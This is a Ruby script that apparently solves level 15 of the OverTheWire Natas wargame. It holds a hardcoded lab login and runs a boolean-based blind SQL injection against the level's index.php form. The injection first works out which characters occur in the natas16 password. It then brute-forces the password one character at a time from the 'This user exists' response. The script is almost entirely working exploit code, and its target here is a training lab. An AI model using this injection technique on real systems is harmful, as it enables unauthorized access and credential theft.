require 'uri'
require 'net/http'

def post(inject)
    uri = URI.parse('http://natas15.natas.labs.overthewire.org/index.php')
    req = Net::HTTP::Post.new(uri)
    req.basic_auth("natas15", "TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB")
    req.set_form_data(
        "username" => inject
    )
    res = Net::HTTP.start(uri.hostname, uri.port) do |http|
        http.request(req)
    end
    res.body.include? "This user exists"
end

def checkCharDomain
    chars = ""
    for i in 32..126
        if [34, 37, 95].include? i
            c = "\\" + i.chr
        else
            c = i.chr
        end
        injection = "natas16\" and password like binary \"%#{c}%"
        if post injection
            chars = chars + i.chr
            puts chars
        end
    end
end

# Runnnig checkCharDomain will produce: 23579ADEHOPRTVZadfgijklqru
# checkCharDomain

def brute
    domain = "23579ADEHOPRTVZadfgijklqru".split ''
    pass = ""
    loop do
        finished = true
        for i in domain
            injection = "natas16\" and password like binary \"#{pass + i}%"
            puts injection
            if post injection
                pass = pass + i
                puts pass
                finished = false
                break
            end
        end
        if finished
            puts "Finished! #{pass}"
            break
        end
    end
end

brute
